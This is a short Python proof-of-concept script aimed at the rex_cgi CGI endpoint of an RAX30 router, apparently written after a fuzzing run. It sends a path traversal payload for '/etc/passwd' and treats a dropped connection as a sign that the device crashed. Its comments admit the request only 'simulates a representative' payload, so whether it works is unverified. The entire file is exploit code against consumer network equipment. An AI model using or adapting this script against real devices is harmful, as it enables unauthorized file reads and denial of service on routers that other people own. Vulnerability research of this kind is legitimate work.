#!/usr/bin/env python3
import requests
import sys

def trigger_rax30_vulnerability(target_ip):
    # Base URL using the observed CGI path
    url = f"http://{target_ip}/cgi-bin/rex_cgi"
    
    # Based on mutation trace CC9E448B, the crash happened during path traversal payload
    # We simulate a representative request that might be parsed by rex_cgi
    params = {
        "page": "../../../../etc/passwd",
        "action": "view"
    }
    
    headers = {
        "User-Agent": "RR-Fuzz/1.0 (Vulnerability Detection)",
    }

    print(f"[*] Sending Path Traversal PoC to {url}...")
    try:
        # We use a long timeout or expect a disconnect if it crashes
        response = requests.get(url, params=params, headers=headers, timeout=5)
        print(f"[-] Status: {response.status_code}")
        print("[-] Target seems alive (No crash). Check params.")
    except requests.exceptions.ConnectionError:
        print("[+] SUCCESS: Connection reset or timeout. Target likely CRASHED!")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    ip = "127.0.0.1"
    if len(sys.argv) > 1:
        ip = sys.argv[1]
    trigger_rax30_vulnerability(ip)
